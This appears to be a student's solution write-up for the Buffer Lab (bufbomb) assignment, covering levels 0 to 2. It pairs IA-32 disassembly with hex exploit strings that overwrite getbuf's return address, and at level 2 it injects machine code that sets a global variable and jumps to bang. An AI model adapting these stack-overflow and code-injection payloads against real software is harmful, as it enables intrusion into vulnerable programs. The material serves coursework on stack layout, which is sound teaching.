# Buffer Lab

> This assignment will help you develop a detailed understanding of IA-32 calling
> conventions and stack organization. It involves applying a series of buffer
> overflow attacks on an executable file bufbomb in the lab directory.

## Level 0: Candle/smoke

Target: get BUFBOMB to execute the code for `smoke` when getbuf executes its return statement

Get `smoke` address from assembly code: `08049415`

```assembly
# buf
08049c12 <getbuf>:
 8049c12:	55                   	push   %ebp
 8049c13:	89 e5                	mov    %esp,%ebp
 8049c15:	83 ec 38             	sub    $0x38,%esp
 8049c18:	83 ec 0c             	sub    $0xc,%esp
 8049c1b:	8d 45 d2             	lea    -0x2e(%ebp),%eax
 8049c1e:	50                   	push   %eax
 8049c1f:	e8 5e fa ff ff       	call   8049682 <Gets>
 8049c24:	83 c4 10             	add    $0x10,%esp
 8049c27:	b8 01 00 00 00       	mov    $0x1,%eax
 8049c2c:	c9                   	leave
 8049c2d:	c3                   	ret
```

`lea -0x2e(%ebp),%eax` => in `buf[M]`, the number of M is 46 => plus 4 bytes in `%ebp`,
the return address should begin at 50.

That is, in this string, the first 50 bytes mean nothing, 50~53 mean the return address.
So, the string should be:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 15 94 04 08
```

## Level 1: Sparkler/fizz

Target: get BUFBOMB to execute the code for `fizz` with argument `cookie`

Assembly code of `fizz`:

```assembly
08049442 <fizz>:
 8049442:	55                   	push   %ebp
 8049443:	89 e5                	mov    %esp,%ebp
 8049445:	83 ec 08             	sub    $0x8,%esp
 8049448:	8b 55 08             	mov    0x8(%ebp),%edx
 804944b:	a1 90 d1 04 08       	mov    0x804d190,%eax
 8049450:	39 c2                	cmp    %eax,%edx      # check if %edx equals to cookie locating in 0x804d190
 8049452:	75 22                	jne    8049476 <fizz+0x34>
 8049454:	83 ec 08             	sub    $0x8,%esp
 8049457:	ff 75 08             	push   0x8(%ebp)
 804945a:	68 23 b0 04 08       	push   $0x804b023
 804945f:	e8 1c fc ff ff       	call   8049080 <printf@plt> # print fizz
 8049464:	83 c4 10             	add    $0x10,%esp
 8049467:	83 ec 0c             	sub    $0xc,%esp
 804946a:	6a 01                	push   $0x1
 804946c:	e8 6f 09 00 00       	call   8049de0 <validate>
 8049471:	83 c4 10             	add    $0x10,%esp
 8049474:	eb 13                	jmp    8049489 <fizz+0x47>
 8049476:	83 ec 08             	sub    $0x8,%esp
 8049479:	ff 75 08             	push   0x8(%ebp)
 804947c:	68 44 b0 04 08       	push   $0x804b044
 8049481:	e8 fa fb ff ff       	call   8049080 <printf@plt> # print buzz, which is wrong
 8049486:	83 c4 10             	add    $0x10,%esp
 8049489:	83 ec 0c             	sub    $0xc,%esp
 804948c:	6a 00                	push   $0x0
 804948e:	e8 bd fc ff ff       	call   8049150 <exit@plt>
```

Similarly, the first 50 bytes mean nothing. 50~53 mean the address of `fizz` which is `08049442`.
54~57 mean nothing. 58~61 mean the cookie `20ba0521`.
Therefore, the string should be:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 42 94 04 08 00 00
00 00 21 05 ba 20
```

## Level 2: Firecracker/bang

Target: get BUFBOMB to execute the code for bang with setting global_value as cookie

Assembly code of `bang`:

```assembly
08049493 <bang>:
 8049493:	55                   	push   %ebp
 8049494:	89 e5                	mov    %esp,%ebp
 8049496:	83 ec 08             	sub    $0x8,%esp
 8049499:	a1 98 d1 04 08       	mov    0x804d198,%eax
 804949e:	89 c2                	mov    %eax,%edx
 80494a0:	a1 90 d1 04 08       	mov    0x804d190,%eax
 80494a5:	39 c2                	cmp    %eax,%edx           # compare *0x804d198 and *0x804d190
 80494a7:	75 25                	jne    80494ce <bang+0x3b>
 80494a9:	a1 98 d1 04 08       	mov    0x804d198,%eax
 80494ae:	83 ec 08             	sub    $0x8,%esp
 80494b1:	50                   	push   %eax
 80494b2:	68 64 b0 04 08       	push   $0x804b064
 80494b7:	e8 c4 fb ff ff       	call   8049080 <printf@plt>
 80494bc:	83 c4 10             	add    $0x10,%esp
 80494bf:	83 ec 0c             	sub    $0xc,%esp
 80494c2:	6a 02                	push   $0x2
 80494c4:	e8 17 09 00 00       	call   8049de0 <validate>
 80494c9:	83 c4 10             	add    $0x10,%esp
 80494cc:	eb 16                	jmp    80494e4 <bang+0x51>
 80494ce:	a1 98 d1 04 08       	mov    0x804d198,%eax
 80494d3:	83 ec 08             	sub    $0x8,%esp
 80494d6:	50                   	push   %eax
 80494d7:	68 89 b0 04 08       	push   $0x804b089
 80494dc:	e8 9f fb ff ff       	call   8049080 <printf@plt>
 80494e1:	83 c4 10             	add    $0x10,%esp
 80494e4:	83 ec 0c             	sub    $0xc,%esp
 80494e7:	6a 00                	push   $0x0
 80494e9:	e8 62 fc ff ff       	call   8049150 <exit@plt>
```

According to gdb, <global_value> locates in `0x804d198`, while <cookie> locates in `0x804d190`.
We need to set <golobal_value> to <cookie> value via assembly code, and finally step into
`bang` locating in `0x08049493`:

```assembly
mov 0x804d190,%eax
mov %eax,0x804d198
push 0x08049493
ret
```

Store the assembly code to <buf> and return to there so that program can execute it.
Before doing that, we need to find out where it is => use gdb with `x $eax` => `0x5568fa12`

* 0~15: assembly code
* 16~49: nothing
* 50~53: buf address

```
a1 90 d1 04 08
a3 98 d1 04 08
ff 35 93 94 04 08
c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00
12 fa 68 55
```